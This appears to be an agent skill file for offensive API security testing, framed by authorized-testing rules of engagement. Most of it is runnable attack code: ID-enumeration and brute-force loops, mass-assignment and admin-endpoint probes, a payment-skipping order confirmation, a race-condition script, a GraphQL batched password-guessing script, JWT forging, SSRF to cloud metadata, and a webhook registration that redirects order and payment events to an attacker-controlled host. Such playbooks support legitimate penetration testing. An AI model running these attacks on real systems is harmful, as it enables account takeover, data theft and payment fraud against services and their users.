---
name: offensive-api-security
description: "API security and business-logic abuse: BOLA/IDOR, BFLA, mass assignment, broken auth, GraphQL, JWT, race, webhook, gRPC, WebSocket. Triggers - OWASP API Top 10, business logic, race."
---

## Rules of Engagement
Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.

# Offensive API Security Testing

Authorized testing of REST, GraphQL, gRPC, and WebSocket APIs against the OWASP API Top 10 and the business-logic gaps scanners miss.

## BOLA and IDOR

Broken Object Level Authorization is the most prevalent API flaw. Capture a legitimate request containing an object identifier and replay it with another user's identifier, keeping your token, e.g. `GET /api/v1/users/1002/orders` with user A's `Authorization` header.

```bash
for id in $(seq 1000 1050); do
  curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer $TOKEN_A" \
    "https://target.example.com/api/v1/users/${id}/orders"
done; echo

# Authorization is often enforced on GET but not on write methods
for method in GET PUT PATCH DELETE; do
  curl -s -o /dev/null -w "${method} %{http_code}\n" -X "$method" \
    -H "Authorization: Bearer $TOKEN_A" -H "Content-Type: application/json" \
    -d '{"status":"cancelled"}' "https://target.example.com/api/v1/users/1002/orders/5001"
done
```

## Broken Authentication

Probe login rate limits and token lifecycle. JWT-specific abuse: see `web-auth-bypass-idor`.

```bash
for i in $(seq 1 100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" \
    -d "{\"email\":\"test@example.com\",\"password\":\"attempt${i}\"}" \
    "https://target.example.com/api/v1/auth/login")
  echo "Attempt ${i}: HTTP ${code}"; [ "$code" = "429" ] && break
done
```

Also replay expired tokens, tokens issued before a password change, and malformed bearer values (`""`, `"null"`, `"Bearer"`) against `/users/me`.

## BFLA, Mass Assignment, and BOPLA

Broken Function Level Authorization: low-privilege users invoking admin functions. Mass assignment and excessive data exposure are property-level (BOPLA) failures.

```bash
for ep in "GET /api/v1/admin/users" "POST /api/v1/admin/users" \
  "DELETE /api/v1/admin/users/1001" "GET /api/v1/admin/config"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "${ep%% *}" \
    -H "Authorization: Bearer $REGULAR_USER_TOKEN" "https://target.example.com${ep#* }")
  echo "${ep} -> HTTP ${code}"
done
```

```bash
# Mass assignment: inject properties that should not be user-controllable
curl -s -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"Updated Name","role":"admin","is_admin":true,
       "permissions":["admin","superuser"],"account_type":"premium"}' \
  "https://target.example.com/api/v1/users/me" | jq .

# Excessive data exposure: compare the full response against what the UI renders
curl -s -H "Authorization: Bearer $TOKEN" "https://target.example.com/api/v1/users/me" | jq .
```

Verb tampering, method-override headers, and content-type switching frequently bypass method- or format-scoped controls:

```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  curl -s -o /dev/null -w "${method} %{http_code}\n" -X "$method" \
    -H "Authorization: Bearer $TOKEN" "https://target.example.com/api/v1/admin/settings"
done
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users/1002"
```

## SSRF

URL-accepting API parameters, webhook registration, and import/export features can reach internal services or cloud metadata. Payloads, filtering bypasses, and proof technique: see `web-ssrf`. Confirm an API-specific fetch by pointing a callback/import URL at `http://169.254.169.254/latest/meta-data/`.

## Rate Limiting, Pagination, and Resource Consumption

```bash
for i in $(seq 1 50); do
  curl -s -D - -o /dev/null -H "Authorization: Bearer $TOKEN" \
    "https://target.example.com/api/v1/search?q=test" 2>&1 | \
    grep -iE "x-rate|retry-after|x-ratelimit"
  sleep 0.1
done
```

```bash
# Probe total counts, oversized page sizes, negative pages
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?page=1&per_page=1" | \
  jq '{total: .total, total_pages: .total_pages, current_page: .page}'
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?page=1&per_page=999999" | jq 'length'

# Forge a cursor to access arbitrary records, and inject sort/filter fields
forged_cursor=$(echo -n '{"id":1}' | base64 -w0)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?cursor=${forged_cursor}&limit=100" | jq .
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/users?sort=password&order=asc" | jq .
```

Oversized input tests whether body size and complexity are bounded; reuse the rate-limit loop above with a multi-megabyte JSON body.

## Business Logic and Workflow Bypass

Individual endpoints may be secure while the workflow connecting them is not. Map the intended sequence, then deviate: skip steps, reorder them, or replay a validated state.

```bash
# Normal flow: add_to_cart -> apply_coupon -> calculate_total -> pay -> confirm
# Test: skip payment and go straight to confirmation
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"cart_id": "CART-12345"}' "https://target.example.com/api/v1/orders/confirm" | jq .

# State manipulation / negative quantities / currency confusion
curl -s -X PATCH -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"status":"pending"}' "https://target.example.com/api/v1/orders/ORD-5001"
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"product_id":"PROD-001","quantity":-1}' "https://target.example.com/api/v1/cart/items"
```

Price/eligibility manipulation: add an item that changes eligibility, force recalculation, then remove it and proceed with the original total.

## Race Conditions and Double-Spend

APIs that fail to serialize concurrent requests against shared state allow duplicate transactions, limit bypass, or balance corruption. Detect double-spend by firing parallel identical requests and counting successes beyond the intended one-per-user limit; do not rely on any single transfer moving funds. Single-use resources (coupons, invitations, limited stock) are the cleanest signal.

```python
#!/usr/bin/env python3
"""Race probe: count concurrent successes against a single-use resource."""
import asyncio, aiohttp
TARGET, HEADERS = "https://target.example.com/api/v1", {"Authorization": "Bearer YOUR_TOKEN"}

async def post(session, path, data):
    async with session.post(f"{TARGET}{path}", json=data, headers=HEADERS) as resp:
        await resp.read(); return resp.status

async def race(path, data, n=20):
    async with aiohttp.ClientSession() as session:
        results = await asyncio.gather(*[post(session, path, data) for _ in range(n)])
        print(f"{path}: {len([s for s in results if s in (200, 201)])}/{n} succeeded")

asyncio.run(race("/cart/coupon", {"coupon_code": "SINGLE-USE"}, n=20))
```

## GraphQL Batching and Depth Abuse

GraphQL batching and nesting bypass per-request rate limiting and authorization. Batching packs many login mutations into one HTTP request; depth and field duplication test whether query complexity is bounded.

```bash
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ __schema { types { name kind fields { name } } } }"}' \
  "https://target.example.com/graphql" | jq '.data.__schema.types[] | select(.kind == "OBJECT")'

curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}' \
  "https://target.example.com/graphql"
```

```python
#!/usr/bin/env python3
"""GraphQL batching: more auth attempts than the per-request rate limit allows."""
import requests, sys
TARGET, BATCH_SIZE = "https://target.example.com/graphql", 50
passwords = [l.strip() for l in open(sys.argv[2]) if l.strip()]
for i in range(0, len(passwords), BATCH_SIZE):
    batch = passwords[i:i + BATCH_SIZE]
    payload = [{"query": f'mutation a{j} {{ login(email:"{sys.argv[1]}", password:"{p}") {{ success }} }}'}
               for j, p in enumerate(batch)]
    resp = requests.post(TARGET, json=payload)
    if resp.status_code == 429:
        print(f"[!] rate limited at {i}"); break
    for j, r in enumerate(resp.json()):
        if r.get("data", {}).get("login", {}).get("success"):
            print(f"[+] {sys.argv[1]}:{batch[j]}"); sys.exit()
```

## JWT Tampering

Algorithm confusion, `none`/`kid`/`jku` injection, and claim tampering: see `web-auth-bypass-idor`. Fast API check with a guessed or empty secret:

```bash
jwt_tool "$JWT_TOKEN" -X a                 # RS256 -> HS256 confusion
jwt_tool "$JWT_TOKEN" -I -pc role -pv admin -S hs256 -p "$KNOWN_SECRET"
```

## Webhook Abuse

Webhook registration redirects server-initiated callbacks to attacker-controlled endpoints, enabling data interception and SSRF.

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url":"https://attacker-listener.example.com/webhook",
       "events":["user.created","order.completed","payment.received"]}' \
  "https://target.example.com/api/v1/webhooks" | jq .

# Existing webhooks may reveal internal URLs and event names
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target.example.com/api/v1/webhooks" | jq '.[] | {id, url, events}'

# Blind SSRF via internal callback targets
for target_url in "http://127.0.0.1:8080/admin" \
  "http://169.254.169.254/latest/meta-data/" "http://elasticsearch.internal:9200/_cat/indices"; do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d "{\"url\": \"${target_url}\", \"events\": [\"test.ping\"]}" \
    "https://target.example.com/api/v1/webhooks" | head -c 200; echo
done
```

## gRPC Testing

Enumerate via reflection, then test object- and function-level authorization with your own token.

```bash
grpcurl -plaintext target.example.com:50051 list
grpcurl -plaintext target.example.com:50051 describe myapp.UserService

# BOLA: request another user's object; BFLA: admin method with a regular token
grpcurl -plaintext -H "authorization: Bearer $TOKEN_A" \
  -d '{"user_id": "1002"}' target.example.com:50051 myapp.UserService/GetUser
grpcurl -plaintext -H "authorization: Bearer $REGULAR_TOKEN" \
  -d '{}' target.example.com:50051 myapp.AdminService/ListAllUsers

# Metadata injection mirrors HTTP header trust
grpcurl -plaintext -H "authorization: Bearer $TOKEN" \
  -H "x-forwarded-for: 127.0.0.1" -H "x-user-role: admin" \
  -d '{}' target.example.com:50051 myapp.AdminService/GetConfig
```

Intercept protobuf traffic with a mitmproxy addon logging `application/grpc` requests and `grpc-status` responses.

## WebSocket Testing

WebSockets bypass many HTTP controls. Test origin validation, message-level authorization, and Cross-Site WebSocket Hijacking.

```bash
websocat -H "Origin: https://evil.example.com" "wss://target.example.com/ws/chat"
websocat "wss://target.example.com/ws/chat"
```

```python
#!/usr/bin/env python3
"""WebSocket message fuzzing: authorization and size handling."""
import asyncio, websockets, json

async def test_ws_injection(url, token):
    async with websockets.connect(url, extra_headers={"Cookie": f"session={token}"}) as ws:
        for payload in [json.dumps({"type": "message", "content": "hello", "user_id": "1002"}),
                        json.dumps({"type": "subscribe", "channel": "../admin/notifications"}),
                        json.dumps({"type": "message", "content": "A" * 1000000})]:
            await ws.send(payload)
            try:
                print(await asyncio.wait_for(ws.recv(), timeout=3))
            except asyncio.TimeoutError:
                print(f"Sent: {payload[:60]} -> no response")

asyncio.run(test_ws_injection("wss://target.example.com/ws/chat", "SESSION_TOKEN"))
```

CSWSH: from an attacker-origin page, open a WebSocket and confirm whether it authenticates on cookie alone and returns data.

## Key References

- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- OWASP WSTG -- Business Logic Testing: https://owasp.org/www-project-web-security-testing-guide/
- gRPC auth: https://grpc.io/docs/guides/auth/
- Race conditions: https://portswigger.net/web-security/race-conditions
- "Hacking APIs" by Corey Ball (No Starch Press)
